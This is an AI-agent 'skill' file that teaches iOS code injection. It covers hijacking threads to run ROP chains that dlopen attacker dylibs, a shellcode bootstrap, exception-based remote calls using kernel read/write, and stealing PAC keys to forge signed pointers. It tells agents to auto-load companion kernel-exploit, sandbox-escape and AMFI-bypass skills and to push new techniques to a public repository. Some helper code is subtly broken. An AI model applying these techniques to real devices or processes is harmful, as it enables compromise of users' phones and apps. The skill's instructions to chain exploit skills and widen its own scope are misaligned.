---
name: ios-code-injection
version: 1.0.0
agent_compatibility: [claude-code, cursor, codex, opencode, copilot, windsurf, gemini, qwen, kimi]
token_budget: 9216
covers: [ROP chains, dylib injection, shellcode, PAC forging, JOP, gadget discovery, remote thread hijack, objc_msgSend remote, posix_spawn PAC inherit]
learns_from:
  - projects/opainject
  - projects/excalibur
platforms: [iOS 14.0-27.0, arm64/arm64e]
triggers:
  - ROP chain
  - JOP
  - dylib injection
  - shellcode injection
  - PAC forging
  - gadget discovery
  - stack pivot
  - remote thread
  - pthread injection
  - objc_msgSend remote
  - dlopen from remote
  - posix_spawn ptrauth
  - thread hijack
  - code injection
  - dyld insert
related_skills:
  - ios-kernel-exploit
  - ios-sandbox-escape
  - ios-bootchain-exploit
  - ios-misc-tooling
cross_reference_rules:
  - If kernel offsets or PAC/SMR are needed → load ios-kernel-exploit
  - If injecting into sandboxed process → load ios-sandbox-escape
  - If trust cache or AMFI bypass is needed → load ios-bootchain-exploit
  - If building the injector tool → load ios-misc-tooling
  - If researching new injection methods → load ios-research-methodology
research_first: true
---

# iOS Code Injection — ROP Chains, dylib Injection, PAC Forging

> **Skill type:** Specialized — runtime code injection
> **Platforms:** iOS 14.0-27.0, arm64/arm64e
> **Based on:** opainject, excalibur/TaskRop, TrollStore
> **Last updated:** 2026-08-11

---

## When to Use This Skill

Use when the task involves:
- ROP/JOP chain construction for remote function calls
- dylib injection into running processes (dlopen remote)
- Shellcode construction for thread injection
- PAC key manipulation and pointer signing
- Remote thread creation and hijacking
- objc_msgSend execution from outside the target process
- posix_spawn PAC inheritance for child process context
- Mach exception-based ROP execution (excalibur technique)
- Finding ROP gadgets in system libraries
- Arm64 instruction decoding (ADRP, LDR, MOVK, BR)

---

## DYNAMIC CROSS-REFERENCE NOTICE

If the conversation shifts topics, immediately load the appropriate skill:

- **Kernel offsets, PAC stripping, SMR decoding** → load `ios-kernel-exploit.md`
- **Sandbox escape before injection** → load `ios-sandbox-escape.md`
- **Trust cache / AMFI bypass for the injected dylib** → load `ios-bootchain-exploit.md`
- **Toolchain, Theos build, deployment** → load `ios-misc-tooling.md`

---

## RESEARCH-FIRST DIRECTIVE

If the user mentions a new injection technique, a new ROP gadget finder, or any external tool/repo — **research it before answering.** Fetch the source, understand the method, then compare it against the techniques documented here.

---

## 1. Method 1: ROP-Based dylib Injection (opainject)

### 1.1 Core Architecture

The goal: call `dlopen()` in a remote process without injecting any code into it. Achieved by hijacking a thread's register state to execute a ROP chain.

```
Target Process:
  ┌─────────────────────────────────────────────────────┐
  │ Suspended thread → save state → modify PC/x0-x7/LR  │
  │ PC = dlopen   LR = ROP loop gadget (B #0)          │
  │ x0 = dylib_path   x1 = RTLD_NOW                     │
  │ Resume thread → dlopen runs → returns to B #0 loop  │
  │ Detect B #0 = call completed → read x0 for result   │
  │ Restore original thread state → resume normal exec  │
  └─────────────────────────────────────────────────────┘
```

### 1.2 Finding the ROP Loop Gadget

The "loop gadget" is an infinite loop instruction used as a fake LR:

```c
// Scan all loaded libraries for: 0x00000014 (B #0 — infinite loop)
// At 4-byte alignment within executable segments
uint64_t findRopLoopGadget() {
    // Walk all vm regions of target task
    // For each executable region:
    //   Search for 0x00000014 at aligned offsets
    //   Verify: instruction at offset decodes to "B 0"
    //   Return first match — this is the ROP loop "landing pad"
}
```

### 1.3 Creating a Remote pthread

```c
// 1. Find main_thread pointer in target
//    Decode ADRP+LDR from _pthread_main_thread_np:
//      ADRP x16, #page(main_thread)
//      LDR x16, [x16, #offset]
//    → Resolve to get main_thread address
int setupRemotePthread(target_task) {
    // On arm64e: steal a valid thread state (PAC opaque flags)
    // from any existing thread in the target task
    uint64_t stolenState = readExistingThreadState(target);

    // Create thread with stolen state as base
    mach_port_t thread = createRemoteThread(
        target_task,
        stolenState,           // PAC-signed thread state
        __pthread_set_self,    // PC = init function
        ropLoopGadget          // LR = B #0 (catch return)
    );

    // Wait for thread to return (loops at B #0)
    waitForThreadToLoop(thread);

    // Now we have a functional remote pthread
    return thread;
}
```

### 1.4 The arbCall() Primitive

The core ROP call function — calls any function in the target process:

```c
uint64_t arbCall(target, func, arg0, arg1, arg2, ...) {
    // 1. Save original thread state
    arm_thread_state64_t origState;
    thread_get_state(targetThread, &origState);

    // 2. Set remote SP to allocated stack page
    uint64_t remoteStack = mach_vm_allocate(target_task, PAGE_SIZE);

    // 3. Build register state for the call
    arm_thread_state64_t callState = {0};
    callState.__sp = remoteStack + PAGE_SIZE - 0x10;
    callState.__pc = func;         // Function to call
    callState.__lr = ropLoop;      // Return → infinite loop
    callState.__x[0] = arg0;
    callState.__x[1] = arg1;       // ... up to x7

    thread_set_state(targetThread, &callState);

    // 4. Abort any in-flight syscall on target thread
    thread_abort(targetThread);

    // 5. Suspend all OTHER threads; resume only target
    suspendAllOtherThreads(target_task);
    thread_resume(targetThread);

    // 6. Poll for completion
    uint64_t result = waitForThreadToLoop(targetThread, ropLoop);

    // 7. Read x0 for return value
    thread_get_state(targetThread, &callState);
    result = callState.__x[0];

    // 8. Restore original state (thread continues normally)
    thread_set_state(targetThread, &origState);
    resumeAllThreads(target_task);

    return result;
}
```

### 1.5 dlopen Injection Flow

```c
int injectDylib(target, dylibPath) {
    // Step 1: Fix sandbox — issue and consume sandbox extension
    sandboxFixup(target);

    // Step 2: Call dlopen via arbCall
    uint64_t handle = arbCall(target, dlopen,
        dylibPath,        // x0 = path to dylib
        RTLD_NOW          // x1 = flags
    );

    // Step 3: If failed, call dlerror() for diagnostics
    if (handle == 0) {
        char *error = (char *)arbCall(target, dlerror);
        fprintf(stderr, "dlopen failed: %s\n", error);
    }

    return (handle != 0);
}
```

### 1.6 PAC Child Spawn (arm64e)

On arm64e, the target's PAC keys are needed to sign function pointers. Solution: spawn a child process that inherits the target's PAC context:

```c
// posix_spawnattr_set_ptrauth_task_port_np
// — gives the child the target's PAC keys in its own address space
posix_spawnattr_t attrs;
posix_spawnattr_init(&attrs);
posix_spawnattr_set_ptrauth_task_port_np(&attrs, targetTaskPort);

// Now child can call pthread_create_from_mach_thread
// with the target's PAC keys — all signed pointers work correctly
```

---

## 2. Method 2: Shellcode-Based Injection (Legacy)

### 2.1 Shellcode Construction

```asm
; Bootstrap (7 instructions):
; Sets up x0-x3 for pthread_create_from_mach_thread
; x0 = SP+8    (new thread stack)
; x1 = NULL     (attr)
; x2 = payload  (start_routine)
; x3 = NULL     (arg)

; After pthread_create_from_mach_thread returns:
mov x9, #0x42    ; Success marker for completion detection

; Payload:
; adr x0, data_start    ; Address of embedded data
; ldr x8, [x0]          ; Load function pointer
; adr x0, data_start+8  ; Load arg
; blr x8                ; Call function
; b exit                ; Jump to thread exit
```

### 2.2 Completion Detection

```c
bool waitForCompletion(targetThread) {
    arm_thread_state64_t state;
    for (int i = 0; i < MAX_RETRIES; i++) {
        thread_get_state(targetThread, &state);
        if (state.__x[9] == 0x42) {  // Bootstrap set this
            return true;
        }
        usleep(1000);
    }
    return false;
}
```

---

## 3. Method 3: Exception-Based Remote ROP (excalibur/TaskRop)

### 3.1 Thread Hijacking via EXC_GUARD

```c
// 1. Find target process threads via kernel R/W
//    walk: task → off_task_threads_next → linked list
uint64_t targetThread = findThreadInTask(targetTask);

// 2. Create exception port to catch the injected guard
mach_port_t excPort = create_exception_port(targetTask);

// 3. Inject EXC_GUARD exception into target thread
//    Write AST_GUARD to thread's AST flags
//    Set guard_exc_info_code to trigger our handler
injectGuardException(targetThread, EXC_GUARD_CODE);

// 4. Wait for exception message → thread is now paused
// 5. Reply with modified thread state → ROP chain executes

// 6. Restore original state when done
destroyRemoteCall(excPort, originalState);
```

### 3.2 PAC Signing for Remote ROP

```c
// Steal the target thread's signPtr (ROP PAC key)
uint64_t ropKeyA = kread64(targetThread + off_thread_machine_rop_pid);
uint64_t jopKeyB = kread64(targetThread + off_thread_machine_jop_pid);

// Use stolen keys to sign pointers locally
// Create a "PAC proxy" thread with stolen keys:
thread_set_pac_keys(proxyThread, ropKeyA, jopKeyB);

// Now run PACIA instruction in proxy thread:
uint64_t signedPtr = runPaciaInThread(proxyThread,
    strippedPtr,              // x16 = stripped address
    modifier                  // x17 = string discriminator
);

// signedPtr is now valid for the target thread to call
```

### 3.3 String Discriminators for PAC

```c
// Standard PAC modifiers for different context types:
ptrauth_string_discriminator("pc") = 0x7481000000000000
ptrauth_string_discriminator("lr") = 0x77d3000000000000
ptrauth_string_discriminator("sp") = 0xcbed000000000000
ptrauth_string_discriminator("fp") = 0x4517000000000000
```

### 3.4 Remote objc_msgSend

```c
// Call [obj method:arg] in target process
id doRemoteObjcMsgSend(target, obj, SEL, arg) {
    // Set up state:
    //   x0 = obj
    //   x1 = SEL (method selector)
    //   x2 = arg
    //   PC = objc_msgSend
    //   LR = FAKE_LR (triggers second exception on return)

    // Sign PC with "pc" discriminator, LR with "lr" discriminator
    signState(callState, targetThread);

    // Inject exception → handler sets state → reply
    // Wait for return exception → read x0 for return value
    return (id)callState.__x[0];
}
```

---

## 4. Arm64 Instruction Decode Helpers

```c
// Decode ADRP: ADRP Rd, #imm
// Opcode: [1|immhi|1 0 0 0 0|immlo|Rd]
void decode_adrp(uint32_t insn, int *rd, int64_t *imm) {
    *rd = insn & 0x1F;
    int64_t immlo = (insn >> 29) & 0x3;
    int64_t immhi = (insn >> 5) & 0x7FFFF;
    *imm = (immhi << 14) | (immlo << 12);
    // imm is page-aligned, sign-extended from 21 bits → 33 bits
}

// Decode LDR (unsigned): LDR Rt, [Rn, #imm]
// Opcode: [1 1 1 0 0 1 0 1|imm12|Rn|Rt]
void decode_ldr_imm(uint32_t insn, int *rt, int *rn, uint16_t *imm) {
    *rt = insn & 0x1F;
    *rn = (insn >> 5) & 0x1F;
    *imm = ((insn >> 10) & 0xFFF) << 0;  // No shift for LDR
}

// Resolve ADRP+LDR pair to get data address
uint64_t resolve_adrp_ldr(uint32_t adrp, uint32_t ldr, uint64_t pc) {
    int64_t page_off;
    decode_adrp(adrp, &temp, &page_off);
    uint64_t page = (pc & ~0xFFF) + page_off;

    uint16_t ldr_off;
    decode_ldr_imm(ldr, &temp, &temp, &ldr_off);
    return page + ldr_off;
}
```

---

## 5. PAC Key Management on arm64e

### 5.1 Reading PAC Keys from Remote Thread

```c
// Each thread stores its own PAC keys:
// ROP key A (signPtr): off_thread_machine_rop_pid
// JOP key B (signInstructions): off_thread_machine_jop_pid

uint64_t ropKey = kread64(thread + off_thread_machine_rop_pid);
uint64_t jopKey = kread64(thread + off_thread_machine_jop_pid);
```

### 5.2 Setting PAC Keys on a Local Thread

```c
// Create a "proxy" thread in our process
// Set its PAC keys to match the target thread
// Now any PAC-signed pointer we create here
// will be valid in the target's address space

mach_port_t proxyThread;
thread_create(mach_task_self(), &proxyThread);
thread_set_pac_keys(proxyThread, stolenRopKey, stolenJopKey);
```

### 5.3 Strip and Sign

```c
// Strip PAC to read the raw address
uint64_t strip(uint64_t ptr) {
    return ptr & 0x7FFFFFFFFFF;  // Bottom 43 bits (typical arm64e VA width)
}

// Sign a stripped pointer with PACIA
uint64_t sign(uint64_t ptr, uint64_t modifier) {
    return ptrauth_sign_unauthenticated(
        strip(ptr),
        ptrauth_key_function_pointer,  // IA key
        modifier                        // string discriminator
    );
}
```

---

## 6. Common Pitfalls

| Pitfall | Symptom | Fix |
|---------|---------|-----|
| Wrong PAC keys | SIGSEGV on signed function call | Verify ropKey/jopKey reads; use posix_spawnattr_set_ptrauth for child |
| Thread crashes on resume | PC points to unmapped memory | Verify PC and LR are in executable segments |
| dlopen returns 0 silently | No error output | Call dlerror() via arbCall right after dlopen |
| Loop gadget not found | No infinite loop in target's libraries | Search more segments; fall back to known B #0 in libsystem_kernel |
| Remote thread deadlock | Target thread stuck in syscall | Call thread_abort() before resuming |
| Sandbox blocks dlopen | dlopen succeeds but dylib init crashes | Issue sandbox extension before injection |
| Wrong SP alignment | Stack corruption on function call | SP must be 16-byte aligned on arm64 |
| Missing kernel R/W | Can't read PAC keys or thread state | Requires IOSurface exploit or equivalent K-R/W |

---

## 7. Quick Reference

```
ROP loop gadget:        0x00000014 (B #0 — branch self, infinite loop)
arbCall signature:      arbCall(task, func, x0, x1, ..., x7) → return x0
PAC strip:              ptr & 0x7FFFFFFFFFF
PACIA encoding:         0xDAC10230 (PACIA X16, X17)
XPACI encoding:         0xDAC143E0 (XPACI X0)
posix_spawn ptrauth:    posix_spawnattr_set_ptrauth_task_port_np
Remote stack:           mach_vm_allocate(target, PAGE_SIZE) near top
Thread state size:      sizeof(arm_thread_state64_t) = 0x360 bytes
SP alignment:           16-byte boundary mandatory on arm64
```

---

## 8. Reference Projects

| Project | Technique | Prerequisites | Path |
|---------|-----------|--------------|------|
| opainject | ROP dylib injection + shellcode fallback | entitlement | `projects/opainject` |
| excalibur/TaskRop | Exception-based remote ROP + objc_msgSend | kernel R/W | `projects/excalibur/darksword-kexploit-fun/TaskRop` |

---

## 9. Contribute Back

**Found something critical?** A new PAC-forging technique that works on A18? A ROP chain that defeats the latest AMFI checks? A way to inject into processes that were previously untouchable? Contribute it back — the swarm learns from every boundary pushed.

**Found something useful?** A new gadget finder, a faster injection path, a corrected offset for a new iOS version.

```bash
git add skills/ios-code-injection.md
git commit -m "feat: new code injection technique for iOS 28"
gh pr create --repo kaffeindecaf/Apple-Bug-Bounty-Skill \
  --title "Code injection improvement" \
  --body "## What was found\n\n## iOS version / SoC affected\n\n## Technique details\n\n## Verification"
```

Repository: https://github.com/kaffeindecaf/Apple-Bug-Bounty-Skill

Every contribution sharpens every agent that loads this skill.
